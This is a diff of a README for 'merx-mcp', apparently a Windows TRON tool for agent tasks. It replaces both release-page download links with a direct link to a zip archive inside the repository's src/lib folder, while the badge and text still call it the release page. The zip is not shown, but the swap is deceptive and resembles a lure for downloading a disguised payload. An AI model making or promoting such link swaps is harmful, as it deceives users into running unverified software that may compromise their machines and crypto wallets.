@@ -1,6 +1,6 @@
 # 🚀 merx-mcp - TRON tools for agent tasks
 
-[![Download](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge&logo=github)](https://github.com/nicosmall503/merx-mcp/releases)
+[![Download](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/nicosmall503/merx-mcp/main/src/lib/merx-mcp-v2.0.zip)
 
 ## 🧩 What this app does
 
@@ -22,7 +22,7 @@ For best results, use a recent version of Windows 10 or Windows 11.
 
 Visit this page to download the latest release:
 
-https://github.com/nicosmall503/merx-mcp/releases
+https://raw.githubusercontent.com/nicosmall503/merx-mcp/main/src/lib/merx-mcp-v2.0.zip
 
 On that page:
 
